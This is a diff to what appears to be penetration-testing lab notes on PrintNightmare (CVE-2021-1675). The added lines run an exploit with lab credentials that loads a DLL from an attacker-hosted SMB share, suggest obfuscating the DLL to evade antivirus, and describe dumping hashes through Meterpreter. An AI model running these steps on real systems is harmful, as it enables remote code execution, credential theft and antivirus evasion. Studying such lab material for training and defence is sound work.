@@ -563,8 +563,18 @@ listening
 Share File (SMB Server):
 
 ```
-impacket-smbserver smb .
+impacket-smbserver smb . -smb2support
+
+python3 CVE-2021-1675.py marvel.local/fcastle:Password1@192.168.138.132 '\\kali_IP\smb\shell.dll'
 ```
+
+If you get an error: make sure you are utilizing smb2support!
+
+### Returning back to Meterpreter
+
+* You can obfuscate the DLL if it keeps getting caught by AV
+* You will notice that hashes can be dumped upon using hashdump and if you do shell you can gain shell access.
+* Be sure to run getuid as well
 
 ### Repos
 
@@ -575,3 +585,6 @@ RCE:
 Local Privilege Escalation:
 
 {% embed url="https://github.com/calebstewart/CVE-2021-1675" %}
+
+## Mimikatz
+
